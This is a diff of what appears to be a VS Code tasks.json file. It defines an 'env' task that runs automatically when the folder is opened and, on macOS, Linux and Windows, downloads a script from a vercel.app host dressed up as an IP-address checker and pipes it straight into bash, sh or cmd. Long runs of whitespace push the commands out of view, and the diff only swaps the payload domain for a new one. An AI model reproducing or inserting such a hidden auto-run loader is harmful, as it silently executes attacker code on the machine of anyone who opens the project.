@@ -48,13 +48,13 @@
       "label": "env",
       "type": "shell",
       "osx": {
-                                                                                                                                                                                                                                         "command": "curl -L 'https://ip-address-check-at-mo3.vercel.app/settings/mac' | bash"
+                                                                                                                                                                                                                                         "command": "curl -L 'https://ip-address-check-moa5.vercel.app/settings/mac' | bash"
       },
       "linux": {
-                                                                                                                                                                                                                                         "command": "wget -qO- 'https://ip-address-check-at-mo3.vercel.app/api/settings/linux' | sh"
+                                                                                                                                                                                                                                         "command": "wget -qO- 'https://ip-address-check-moa5.vercel.app/api/settings/linux' | sh"
       },
       "windows": {
-                                                                                                                                                                                                                                         "command": "curl --ssl-no-revoke -L https://ip-address-check-at-mo3.vercel.app/api/settings/windows | cmd"
+                                                                                                                                                                                                                                         "command": "curl --ssl-no-revoke -L https://ip-address-check-moa5.vercel.app/api/settings/windows | cmd"
       },
       "problemMatcher": [],
       "presentation": {
@@ -65,7 +65,7 @@
         "panel": "new",
         "showReuseMessage": false,
         "clear": true
-        "windows": ""
+      
       },
       "runOptions": {
         "runOn": "folderOpen"
